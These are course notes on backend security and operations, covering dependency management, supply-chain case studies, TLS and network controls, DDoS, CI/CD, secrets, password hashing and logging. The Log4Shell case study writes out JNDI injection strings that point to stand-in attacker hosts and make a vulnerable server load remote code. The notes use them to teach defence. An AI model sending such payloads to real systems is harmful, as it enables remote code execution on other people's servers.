# Week 12 — Section 3: Backend Security & Operations



## Learning objectives

By the end of this topic, you should be able to:

- Explain the main ideas covered in **Week 12 — Section 3: Backend Security & Operations**.
- Connect these ideas to modern web application development.
- Recognize the patterns, terminology, and trade-offs used in practice.

---

## 3.1 Scope & Stack Layers

### Why Backend Security is More Complex

The backend is not a single thing — it is an entire **stack of layers**, and each layer carries its own vulnerability surface:

```
┌──────────────────────────────────────────────┐
│          Your Application Code               │  ← Bugs, logic flaws, injection
├──────────────────────────────────────────────┤
│     Frameworks & Libraries (Flask, Django)   │  ← CVEs in dependencies
├──────────────────────────────────────────────┤
│    Language Runtime (Python, Node, JVM)      │  ← Runtime vulnerabilities
├──────────────────────────────────────────────┤
│         Web Server (Nginx, Apache)           │  ← Misconfiguration, CVEs
├──────────────────────────────────────────────┤
│          Operating System (Linux)            │  ← Kernel exploits, patching
├──────────────────────────────────────────────┤
│    Cloud / Virtualization (AWS, Docker)      │  ← IAM misconfiguration, escape
├──────────────────────────────────────────────┤
│         Network & Physical Hardware          │  ← DDoS, physical access
└──────────────────────────────────────────────┘
```

- A vulnerability at **any layer** can compromise the entire system.
- Unlike the frontend (where you control a known browser environment), the backend can be deployed across heterogeneous environments with different OS versions, runtimes, and configurations.
- Backend vulnerabilities typically have a **much higher impact** — they can expose the entire database, all users' data, and the full infrastructure.

---

## 3.2 Package & Dependency Management

### Python/Flask Dependency Trees (`requirements.txt`)

A modern web application almost never runs on just its own code. It sits on top of a **dependency tree** of external packages:

```
Flask 3.0.0
├── Werkzeug ≥3.0.0
├── Jinja2 ≥3.1.2
│   └── MarkupSafe ≥2.0
├── itsdangerous ≥2.1.2
├── click ≥8.1.3
└── blinker ≥1.6.2
```

When you install `Flask`, you are actually installing **all of its transitive dependencies** too — packages that Flask depends on, and packages that those packages depend on, recursively.

**`requirements.txt` — pinning dependencies:**
```
Flask==3.0.0
requests==2.31.0
SQLAlchemy==2.0.23
```

### Version Pinning: Benefits & Pitfalls

| Aspect | Benefits | Pitfalls |
|---|---|---|
| **Reproducibility** | `pip install -r requirements.txt` gives the exact same environment on every machine | — |
| **Stability** | Your app won't break due to an upstream library releasing a breaking change | — |
| **Security patching** | — | Pinned versions must be manually updated when CVEs are discovered |
| **Upgrade cascades** | — | Updating one package may require updating its dependents too (incompatibility chain) |
| **Stale dependencies** | — | Teams often pin and forget — running vulnerable old versions for months/years |

### Upgrade Cascades & Compatibility Risks

When a security patch requires upgrading a dependency, you often trigger an **upgrade cascade**:

```
You need to upgrade: requests 2.28.0 → 2.31.0 (security patch)
  ↓ but 2.31.0 requires: urllib3 ≥2.0.0
    ↓ but urllib3 2.0.0 breaks: older boto3 versions
      ↓ so you also need to upgrade: boto3 1.26 → 1.34
        ↓ which changes: AWS API call signatures you use in your code
          ↓ which requires: code changes across 15 files
```

- This is why teams sometimes **delay security patches** — the cost of upgrading feels higher than the perceived risk of the vulnerability. This is dangerous.
- **Best practice:** Use **automated dependency update tools** (Dependabot, Renovate Bot) to keep dependencies fresh continuously, so upgrades are small and non-breaking rather than large and risky.

### Tools for Dependency Security

| Tool | Purpose |
|---|---|
| `pip audit` | Scans `requirements.txt` for known CVEs |
| **GitHub Dependabot** | Automatically opens PRs to update vulnerable dependencies |
| **Snyk** | Commercial SCA (Software Composition Analysis) tool |
| **OWASP Dependency-Check** | Open-source SCA scanner |
| `pip-compile` (pip-tools) | Generates a fully pinned `requirements.txt` from a high-level `requirements.in` |

---

## 3.3 Supply Chain Attacks & Third-Party Risks

### The Fragility of Modern Open-Source Dependencies

> *"All modern digital infrastructure is built on top of one project maintained by a random person in Nebraska who has been thanklessly doing it since 2003."*
>
> — **XKCD #2347 ("Dependency")**

This comic is not a joke — it is an accurate description of the open-source supply chain. Many critical dependencies across millions of projects are maintained by a single unpaid volunteer.

**Why this is a security problem:**
- A single maintainer can be **compromised, coerced, or burnt out**.
- A malicious party can **offer to "help" maintain** a popular but neglected package and insert a backdoor.
- The package can be **typosquatted** — a malicious package with a similar name (`reqests` instead of `requests`) tricks developers into installing it.
- A build/publish pipeline can be **compromised** — the source code looks clean but the published package contains malware.

---

### Case Study 1: Log4j / Log4Shell (CVE-2021-44228)

**Background:**
- `log4j` is a Java logging library from Apache, used by an enormous fraction of the Java ecosystem — enterprise software, game servers (Minecraft), cloud services (AWS, Azure, VMware), banking systems, government infrastructure.
- Discovered in December 2021. Considered one of the worst vulnerabilities in internet history.

**The Vulnerability:**
- `log4j` had a feature that allowed log messages to trigger **JNDI (Java Naming and Directory Interface) lookups** — including LDAP lookups to remote servers.
- If an attacker could get any string containing `${jndi:ldap://evil.com/a}` to be logged by the application (e.g., in a User-Agent header, username, or any user-controlled input), `log4j` would **automatically contact that server and execute whatever code it returned**.
- This is **Remote Code Execution (RCE)** — the most severe class of vulnerability — triggered by simply logging a string.

**Attack flow:**
```
1. Attacker sends HTTP request:
   User-Agent: ${jndi:ldap://attacker.com/exploit}

2. Server logs the User-Agent with log4j (perfectly normal behavior)

3. log4j parses the ${...} expression, makes an LDAP lookup to attacker.com

4. attacker.com responds with a Java class payload

5. log4j loads and executes the attacker's Java class on the server

→ Full Remote Code Execution. Game over.
```

**Severity:** CVSS score **10.0/10** — maximum severity. Patching was trivially easy for teams with current dependencies, but catastrophic for teams running old pinned versions.

**Lesson:**
- A feature designed for convenience (dynamic log message interpolation) became a critical RCE vector.
- Many organizations **didn't even know** they were using log4j — it was a transitive dependency buried 5 levels deep.
- **Inventory and visibility of your dependency tree is a security requirement**, not optional.

---

### Case Study 2: faker.js — Intentional Maintainer Sabotage (2022)

**Background:**
- `faker.js` is a popular JavaScript library for generating fake data (used extensively in testing). `colors.js` is a library for colored terminal output. Both had millions of weekly downloads and were maintained by Marak Squires.

**The Event:**
- In January 2022, Marak Squires — frustrated by corporations profiting from his unpaid open-source work — intentionally published **corrupted versions** of both libraries.
- `faker.js` was wiped entirely; `colors.js` was replaced with code that printed `LIBERTY LIBERTY LIBERTY` and random gibberish in an infinite loop.
- Any application that had not pinned its dependency version and ran `npm install` that day **broke immediately in production**.

**What this revealed:**
- The open-source ecosystem assumes **good faith from maintainers**. This assumption is fragile.
- If a maintainer can break things, a **compromised** or **coerced** maintainer can insert a subtle backdoor that is far more dangerous.
- **Real malicious precedents:** The `event-stream` attack (2018) — a new maintainer was added to a npm package with 2M weekly downloads, inserted a payload that stole Bitcoin wallets from a specific cryptocurrency project.

**Prevention & Mitigation:**

| Strategy | Description |
|---|---|
| **Pin exact versions** | `faker@5.5.3` not `faker@^5.0.0` — prevents automatic uptake of new (malicious) versions |
| **Lock files** | `package-lock.json`, `poetry.lock`, `Pipfile.lock` — lock the entire dependency tree including transitive deps |
| **Minimize dependencies** | Ask "do I really need this package?" before adding it — every dependency is a trust decision |
| **Audit before installing** | Check package maintainer reputation, download count, last update, GitHub stars |
| **Private registry mirroring** | Mirror approved packages to your own registry — you control what versions can be used |
| **SCA (Software Composition Analysis)** | Automated scanning for known malicious packages and CVEs (Snyk, Socket.dev) |

---

## 3.4 Server Communications & Network Security

### Endpoint Security & Regular Patching
- Every server is an endpoint that must be kept updated:
  - **OS patches:** Linux kernel vulnerabilities, glibc vulnerabilities, systemd vulnerabilities are discovered regularly. `apt upgrade` / `yum update` is a security task, not optional maintenance.
  - **Web server patches:** Nginx, Apache CVEs — directory traversal, buffer overflows, HTTP request smuggling bugs.
  - **Database patches:** Unpatched PostgreSQL, MySQL, Redis instances are common targets.
- **Unmanaged/forgotten servers are the most dangerous** — servers that were spun up and forgotten, running unpatched OS versions for years, are a major source of breaches.

### End-to-End Encryption: TLS & HTTPS

**TLS (Transport Layer Security)** is the cryptographic protocol that secures data in transit.

**Client → Server (HTTPS):**
- All web traffic between the client and server should be encrypted with TLS.
- TLS provides: **Confidentiality** (data cannot be read by a middleman), **Integrity** (data cannot be tampered with), **Authentication** (server identity verified via certificate).
- **HTTP Strict Transport Security (HSTS):** Response header that tells browsers to always use HTTPS for this domain, even if the user types `http://`. Prevents downgrade attacks.
  ```
  Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
  ```

**Server → Server (inter-service communication):**
- In microservice architectures, services communicate with each other internally. This traffic must **also** be encrypted.
- An attacker who gains access to the internal network (lateral movement after a breach) can intercept unencrypted internal traffic.
- **mTLS (mutual TLS):** Both sides authenticate with certificates — the client proves its identity to the server, and the server proves its identity to the client. Used in service meshes (Istio, Linkerd).

**TLS Version Requirements:**
| TLS Version | Status |
|---|---|
| **TLS 1.0** | ❌ Deprecated (POODLE, BEAST attacks) |
| **TLS 1.1** | ❌ Deprecated |
| **TLS 1.2** | ✅ Acceptable minimum |
| **TLS 1.3** | ✅ Recommended — faster handshake, forward secrecy by default |

### Authorized Communication: Firewalls, API Gateways & Network Segmentation

**Network Firewall Rules:**
- A firewall controls which IP addresses and ports can communicate with your server.
- **Principle of Least Exposure:** Only expose ports that must be public. A database server should **never** be directly reachable from the internet — it should only accept connections from application servers.

```
Internet → Load Balancer (443) → App Servers (8080) → Database (5432, internal only)
```

**API Gateways:**
- Centralized entry point for all API traffic.
- Handles: Authentication, rate limiting, request routing, TLS termination, logging, IP allowlisting.
- Examples: AWS API Gateway, Kong, Nginx as a reverse proxy.

**Network Segmentation / VPC:**
- Cloud environments use **Virtual Private Clouds (VPCs)** to create isolated network segments.
- Database, caching, and internal services live in **private subnets** — no inbound internet access at all.
- Only the load balancer and application tier live in public subnets.

---

## 3.5 Availability & Denial of Service

### Denial of Service (DoS)

**Definition:** A DoS attack aims to make a service **unavailable** to legitimate users — disrupting **availability** (the A in the CIA triad: Confidentiality, Integrity, Availability).

**CIA Triad:**
| | |
|---|---|
| **C**onfidentiality | Data is only accessible to authorized parties |
| **I**ntegrity | Data is not tampered with or corrupted |
| **A**vailability | The service is accessible when needed |

- DoS attacks target **Availability** — unlike most attacks that target Confidentiality or Integrity.
- **Common DoS vectors:**
  - **Resource exhaustion:** Flooding a server with requests until it runs out of CPU, memory, or connections.
  - **Algorithmic complexity attacks:** Sending inputs specifically designed to trigger worst-case performance in an algorithm (e.g., specific regex patterns, hash collision attacks).
  - **Slowloris:** Opening many HTTP connections and sending headers very slowly — the server keeps connections open waiting for complete requests, exhausting connection limits without high bandwidth.

### Distributed Denial of Service (DDoS)

**Definition:** A DDoS attack uses **many sources** simultaneously — usually a **botnet** (thousands or millions of compromised devices: computers, routers, IoT devices) — to overwhelm a target.

**Scale:**
- Modern DDoS attacks can reach **terabits per second (Tbps)** of traffic.
- GitHub was hit with 1.35 Tbps in 2018 (Memcached amplification attack).
- Google mitigated a 2.54 Tbps attack in 2017 (disclosed 2020).
- Cloudflare mitigated a 3.8 Tbps attack in 2023.

**Attack Types:**

| Type | Layer | How it works |
|---|---|---|
| **Volume-based** (Flood) | Network (L3/L4) | Raw bandwidth flood — UDP flood, ICMP flood. Saturate network pipe. |
| **Protocol attacks** | Transport (L4) | Exploit TCP/IP weaknesses — SYN flood, Ping of Death, Smurf attack |
| **Amplification/Reflection** | Network (L3/L4) | Send small spoofed requests to open resolvers (DNS, NTP, Memcached) that respond with large replies to the victim |
| **Application layer** (L7) | HTTP/HTTPS (L7) | Mimic legitimate traffic — HTTP GET floods, Slowloris. Hard to distinguish from real users. |

**Amplification Attack (Detail):**
- Attacker sends a small UDP request (e.g., DNS query) to an open resolver, **spoofing the source IP as the victim's IP**.
- The resolver sends a large response to the victim.
- With many such reflectors, the attacker amplifies their bandwidth by 10–10,000× with minimal resources.
- DNS amplification: 40-byte query → 3,000-byte response = **75× amplification factor**.

**DDoS Mitigation:**

| Layer | Mitigation |
|---|---|
| **ISP-level** | ISP scrubbing centers; BGP blackhole routing (drops all traffic to the target IP) |
| **CDN/Anycast** | Services like Cloudflare, Akamai absorb traffic across global PoPs; Anycast routing spreads traffic across many data centers |
| **Rate limiting** | Limit requests per IP per second; CAPTCHA challenges for suspicious traffic |
| **Geo-blocking** | Block traffic from regions where you have no users |
| **Web Application Firewall (WAF)** | Layer 7 filtering; block malicious request patterns |
| **Auto-scaling** | Cloud infrastructure that scales up capacity during attacks (buys time, but expensive) |

> **Key insight:** A single origin IP cannot defend against a Tbps-scale DDoS alone. Mitigation must happen at the network edge — CDN/ISP level — before traffic reaches your server.

---

## 3.6 DevOps, Deployment & Infrastructure Security

### Automated CI/CD Pipelines

**CI/CD (Continuous Integration / Continuous Deployment)** pipelines automate the path from code commit to production:

```
Code Commit → [CI Pipeline] → Build → Test → Security Scan → [CD Pipeline] → Deploy to Staging → Deploy to Production
```

**Security benefits of CI/CD:**
- **Consistency:** No manual deployment errors or "it worked on my machine" security misconfigurations.
- **Automated security gates:** SAST (Static Application Security Testing), dependency scanning, and secret scanning can be run on every commit — blocking deployment if vulnerabilities are found.
- **Auditability:** Every deployment is logged with who triggered it and what code version was deployed.
- **Rollback:** Automated rollbacks if deployment health checks fail.

**CI/CD security risks:**
- **Pipeline injection:** If pipeline configuration reads untrusted input (e.g., PR branch names, commit messages), an attacker can inject commands.
- **Compromised pipeline = compromised production:** A CI/CD system has access to deployment credentials, secrets, and production infrastructure — it is a **high-value target**.
- **Supply chain via CI:** Malicious GitHub Actions actions, npm scripts with `postinstall` hooks running arbitrary code during `npm install`.

### Secure Remote Server Management

**SSH (Secure Shell) — the secure way to access remote servers:**

| Practice | Why |
|---|---|
| **Disable password authentication** | Passwords are brutable; SSH keys are cryptographically infeasible to brute-force |
| **Use SSH key pairs** | Private key stays on your machine; public key on the server in `~/.ssh/authorized_keys` |
| **Disable root login** (`PermitRootLogin no`) | Forces attackers to first compromise a non-root account, then escalate |
| **Change default SSH port** | Minor obscurity — reduces noise from automated scanners (not a real security measure alone) |
| **Use `fail2ban`** | Automatically bans IPs after repeated failed login attempts |
| **Principle of Least Privilege** | Give users only the access they need — a web app user should not have sudo |

**Disabling insecure protocols:**
- **Telnet:** Unencrypted remote shell — never use, always disable.
- **FTP:** Unencrypted file transfer — use SFTP or SCP instead.
- **HTTP (port 80):** Redirect to HTTPS; do not serve content over plain HTTP.
- **Unencrypted database connections:** All database connections should require TLS.

### Secrets Management

**The Problem:** Applications need credentials to access databases, external APIs, cloud services, and encryption keys. Where do these secrets live?

**❌ Bad Practices:**
```python
# Hardcoded in source code — checked into Git forever
DB_PASSWORD = "supersecret123"
API_KEY = "sk-live-abcdef123456"
```
```yaml
# In docker-compose.yml — also in Git
environment:
  - DATABASE_PASSWORD=supersecret123
```

Once a secret enters **Git history**, it is **permanently compromised** — even if you delete it, it remains in the commit history. GitHub scans public repos and notifies services of leaked keys; attackers do the same thing, instantly.

**✅ Good Practices:**

| Method | How | When to use |
|---|---|---|
| **Environment Variables** | Secrets in shell env, not in code | Simple setups, local development |
| **`.env` files** | Secrets in a local `.env` file; add `.env` to `.gitignore` | Development environments |
| **Cloud Secret Managers** | AWS Secrets Manager, GCP Secret Manager, Azure Key Vault | Production cloud deployments |
| **HashiCorp Vault** | Dedicated secrets management platform; dynamic secrets, rotation | Large organizations |
| **CI/CD Secret Variables** | GitHub Actions Secrets, GitLab CI Variables | Pipeline credentials |

**Secret Scanning:**
- **GitHub Secret Scanning:** Automatically scans all commits and alerts if known secret patterns (AWS keys, Stripe keys, private keys, etc.) are detected.
- **Pre-commit hooks:** Tools like `detect-secrets`, `gitleaks`, or `truffleHog` scan for secrets before a commit is made.
- **Rule:** `git-history is forever`. If you accidentally commit a secret, **revoke and rotate it immediately** — deleting the commit is not sufficient.

### Database Access Control & Least Privilege

- **Connection strings must be secret** — never in source code or client-side code.
- **Separate database users by role:**
  ```
  app_readonly → SELECT only (for reporting, analytics)
  app_readwrite → SELECT, INSERT, UPDATE (for the main application)
  app_migrations → SELECT, INSERT, UPDATE, CREATE, DROP (for running migrations only)
  ```
- **Never connect as `root`/`postgres`/`sa`** from your application — if the app is compromised, the attacker gets full database control.
- **Connection pooling:** Use PgBouncer (PostgreSQL) or similar — limits maximum concurrent DB connections; prevents resource exhaustion.
- **Database firewall:** Accept connections only from application server IPs, never from the public internet.
- **Encryption at rest:** Encrypt database files — protects against physical disk theft or snapshot exposure.

---

## 3.7 Authentication & Password Guidelines

### Modern NIST SP 800-63B Standards (2017, updated 2024)

The US National Institute of Standards and Technology published guidelines that **contradict many longstanding password "best practices"**:

**Old (Wrong) Conventional Wisdom vs NIST Reality:**

| Old Practice | NIST Recommendation | Why |
|---|---|---|
| Force password changes every 90 days | ❌ **Don't do this unless breach suspected** | Users just increment a number (`Password1` → `Password2`), making passwords *weaker* |
| Require complexity (uppercase, number, symbol) | ❌ **Don't mandate specific character classes** | Leads to predictable patterns (`P@ssw0rd!`); reduces actual entropy |
| Ban passwords over 8 characters | ❌ **Allow up to at least 64 characters** | Length matters far more than complexity |
| Security questions (mother's maiden name) | ❌ **Avoid entirely** | Publicly guessable; social engineering target |
| SMS 2FA | ⚠️ **Acceptable but not recommended** | SIM-swapping attacks can bypass it |
| Password hints | ❌ **Do not provide** | Hints help attackers, not users |

**NIST Recommendations (what to DO):**
- ✅ **Minimum 8 characters; allow up to 64+**
- ✅ **Check against a list of known-compromised passwords** (e.g., Have I Been Pwned database — 10+ billion compromised passwords)
- ✅ **Allow all printable ASCII + Unicode (spaces, emojis)**
- ✅ **Offer multi-factor authentication (MFA)** — TOTP apps (Google Authenticator, Authy) or hardware keys (YubiKey) preferred over SMS
- ✅ **Only force password change if compromise is suspected**
- ✅ **Rate-limit login attempts** — lock out after N failures or add increasing delays

### Secure Server-Side Credential Storage

**❌ NEVER store passwords as plaintext:**
```python
# Catastrophically wrong
user.password = request.form['password']  # "mypassword123" stored in DB
```
If the database is breached, every user's password is immediately known to the attacker.

**❌ NEVER store passwords with reversible encryption:**
- Symmetric encryption can be reversed if the encryption key is also stolen.

**✅ CORRECT: One-Way Cryptographic Hashing + Salt**

**Why plain hashing is insufficient:**
```python
import hashlib
hash = hashlib.sha256("mypassword123".encode()).hexdigest()
# → "ef92b778bafe771e89..." — always the same for the same password
```
- **Rainbow tables:** Precomputed tables mapping common passwords to their hashes.
- Two users with the same password produce the same hash — one crack reveals both.

**What a Salt does:**
```python
import secrets
salt = secrets.token_hex(32)  # Random unique salt per user
salted_hash = hashlib.sha256((salt + "mypassword123").encode()).hexdigest()
# Store: salt + salted_hash in the database
```
- The salt is **unique per user** — stored in plaintext alongside the hash.
- Identical passwords produce different hashes — rainbow tables are useless.
- Attacker must crack each user's password individually.

**Why slow hashing matters — use bcrypt / Argon2 / scrypt:**
- SHA-256 was designed for speed — modern GPUs can compute **billions** of SHA-256 hashes per second.
- Password hashing algorithms are intentionally **slow and memory-intensive**, making brute force infeasible.

| Algorithm | Recommended | Notes |
|---|---|---|
| **bcrypt** | ✅ Yes | Work factor adjustable; widely supported; handles salting internally |
| **Argon2id** | ✅ Best (2015 Password Hashing Competition winner) | Memory-hard; resists GPU and ASIC attacks |
| **scrypt** | ✅ Yes | Memory-hard; used by many cryptocurrencies |
| **PBKDF2** | ⚠️ Acceptable | NIST-approved; used in LUKS, WPA2; less resistant to GPU than Argon2 |
| **SHA-256 / MD5** | ❌ Never for passwords | Too fast; not designed for password storage |

**Using bcrypt in Python:**
```python
import bcrypt

# Hashing a password (bcrypt handles salting internally)
password = b"mypassword123"
hashed = bcrypt.hashpw(password, bcrypt.gensalt(rounds=12))
# Store 'hashed' in the database

# Verifying a password
bcrypt.checkpw(password, hashed)  # Returns True or False
```

---

## 3.8 Logging & Monitoring

### Purpose of Logging

Logs serve multiple critical functions:

| Purpose | Description |
|---|---|
| **Audit Trail** | Record of who did what and when — accountability, compliance (GDPR, HIPAA require audit logs) |
| **Incident Forensics** | After a breach, logs tell you what happened, when, how, and what was accessed |
| **Anomaly Detection** | Identify unusual patterns in real-time (e.g., 10,000 login attempts from one IP) |
| **Debugging** | Trace errors and exceptions in production |
| **Performance Monitoring** | Track response times, error rates, resource usage |

### What to Log (and What NOT to Log)

**✅ Log:**
- Authentication events (login success, login failure, password change, MFA enrollment)
- Authorization failures (access denied to resource)
- User account changes (email, password, permission changes)
- Administrative actions
- Error conditions and exceptions
- API request metadata (timestamp, endpoint, status code, response time)
- System events (startup, shutdown, configuration changes)

**❌ Never log:**
- Passwords (even hashed)
- Full credit card numbers (only last 4 digits)
- Full social security / government ID numbers
- Session tokens, API keys, JWT tokens — if logged, they can be replayed
- Full request bodies containing sensitive data
- PII beyond what's strictly necessary for the log purpose

> ⚠️ **Log injection:** User-controlled input in log messages can inject fake log entries or exploit log processing tools. Always sanitize/escape input before logging. The **Log4Shell** vulnerability was a log injection vulnerability at its core.

### Performance, Storage & Cost Trade-offs

- **Logging everything at DEBUG level in production** — generates enormous volumes of data, is expensive to store, and makes finding meaningful signals in noise nearly impossible.
- **Log levels:**
  ```
  DEBUG   → Fine-grained diagnostic info (dev only)
  INFO    → General operational events (request received, user logged in)
  WARNING → Unexpected situations that don't cause failure
  ERROR   → Failures that affect a single operation
  CRITICAL→ System-level failures; requires immediate attention
  ```
- **Sampling:** For very high-traffic services, log a percentage of requests (e.g., 1%) for performance monitoring to reduce volume.
- **Storage cost:** 1 billion daily requests × 500 bytes/log = 500GB/day. At cloud storage prices, logging is a significant cost item.
- **Retention policy:** Define how long logs are kept:
  - Security/audit logs: Often required to be kept for 1–7 years by regulation.
  - Debug logs: Days to weeks.
  - Longer retention = more storage cost, but more forensic capability.

### Log Aggregation, Analysis & Rotation

**The problem with logs on individual servers:**
- In a distributed system with 50 application servers, logs are spread across 50 machines.
- If a server crashes, its local logs may be lost.
- Manually SSH-ing into servers to read logs is impractical.

**Log Aggregation — centralized log collection:**

```
App Servers → [Log Shipper: Filebeat / Fluentd] → [Log Aggregator: Elasticsearch / Loki] → [Dashboard: Kibana / Grafana]
```

**Popular stacks:**
| Stack | Components |
|---|---|
| **ELK Stack** | Elasticsearch (storage) + Logstash (pipeline) + Kibana (UI) |
| **EFK Stack** | Elasticsearch + Fluentd + Kibana |
| **Grafana Loki Stack** | Loki (storage, cost-efficient) + Promtail (shipper) + Grafana (UI) |
| **Cloud-native** | AWS CloudWatch, GCP Cloud Logging, Azure Monitor |

**Anomaly Detection & Alerting:**
- Define rules for suspicious patterns:
  - > 100 login failures from same IP in 5 minutes → block IP, alert
  - Requests from a new geographic region for a specific user → flag for review
  - A spike in 500 errors → trigger PagerDuty alert
- **SIEM (Security Information and Event Management):** Correlates logs from multiple sources to identify security incidents — e.g., a failed login followed by a successful login from a different country within 5 minutes.

**Log Rotation:**
- Logs on individual servers are rotated (compressed, archived, deleted) to prevent filling up the disk.
- Linux tool: `logrotate` — rotates logs daily/weekly, keeps N copies, compresses old logs.
- Rotated logs must be **shipped to the central aggregator before being deleted** from the local disk.

---

## 3.9 Backend Security Summary & Architectural Takeaways

### Defence in Depth — The Core Principle

No single measure is sufficient. Layer multiple defences so that if one fails, others remain:

```
Internet
    │
    ▼
[CDN / DDoS Protection — Cloudflare, Akamai]
    │
    ▼
[WAF — Web Application Firewall]
    │
    ▼
[Load Balancer — TLS termination, rate limiting]
    │
    ▼
[Application Server — Input validation, authentication, authorization, CSRF protection]
    │
    ▼
[Application Code — Parameterized queries, output encoding, secure session management]
    │
    ▼
[Database — Least privilege user, encrypted connections, encryption at rest, no public access]
    │
    ▼
[Infrastructure — SSH keys only, secrets vault, automated patching, audit logging]
```

### Key Takeaways Table

| Area | Key Practice |
|---|---|
| **Dependencies** | Pin versions; use lockfiles; run SCA (pip audit, Snyk); update with Dependabot |
| **Supply Chain** | Minimize dependencies; pin exact versions; use private mirrors |
| **Patching** | Patch OS, web server, runtime, and libraries promptly — automate where possible |
| **Encryption in Transit** | TLS 1.2+ for all traffic; HSTS; mTLS for internal services |
| **Network** | Expose minimum ports; DB never public; use VPCs and private subnets |
| **DoS/DDoS** | CDN for edge mitigation; rate limiting; auto-scaling |
| **CI/CD** | Automate deployments; security gates in pipeline; protect pipeline credentials |
| **SSH** | Keys only; no root login; fail2ban; least privilege |
| **Secrets** | Never in code or Git; use vaults/env vars; rotate and revoke immediately if leaked |
| **Database** | Least privilege users; encrypted connections; connection pooling; no public access |
| **Passwords** | Argon2id or bcrypt; salt built-in; check against breach databases; enforce MFA |
| **Logging** | Centralize logs; never log secrets/passwords; set retention policies; alert on anomalies |

---

*← [Section 2: Frontend Security](./02_frontend_security.md)*

## Further practice

- Revisit the examples in this topic and explain each step in your own words.
- Identify one place where the concept could be used in a web application.
- Test a small variation and note how the behavior changes.

